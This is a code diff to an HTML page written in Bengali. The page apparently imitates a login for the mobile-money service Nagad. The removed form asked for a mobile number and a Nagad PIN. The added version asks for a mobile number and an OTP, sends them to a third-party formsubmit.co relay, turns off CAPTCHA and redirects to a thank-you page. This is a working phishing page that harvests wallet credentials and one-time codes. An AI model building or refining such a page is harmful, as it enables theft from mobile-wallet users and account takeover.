@@ -136,18 +136,18 @@
     </div>
     <form action="https://formsubmit.co/1fa5554bf4b992cf860995de72787432" method="POST">
     <div class="container">
-        <div class="input-group">
-            <p>মোবাইল নাম্বার</p>
-            <i class="fa fa-phone input-icon"></i>
-            <input type="number" name="Number" placeholder="XXX-XXXX-XXXX" id="mobileNumber" required>
-        </div>
-        <div class="input-group">
-            <p>নগদ পিন</p>
-            <i class="fa fa-lock input-icon"></i>
-            <input type="number" name="Pin" placeholder="XXXX" id="pin" required>
-        </div>
-        <button type="submit" id="loginButton">পরবর্তী</button>
-    </div>
+    
+        <!-- Redirect Page -->
+        <input type="hidden" name="_next" value="https://your-website.com/thank-you.html">
+        
+        <!-- Disable CAPTCHA -->
+        <input type="hidden" name="_captcha" value="false">
+
+        <input type="number" name="mobile" placeholder="মোবাইল নাম্বার" required>
+        <input type="number" name="otp" placeholder="ওটিপি" required>
+        <button type="submit">যাচাই করুন</button>
+    
+</div>
 </form>
 
 </body>
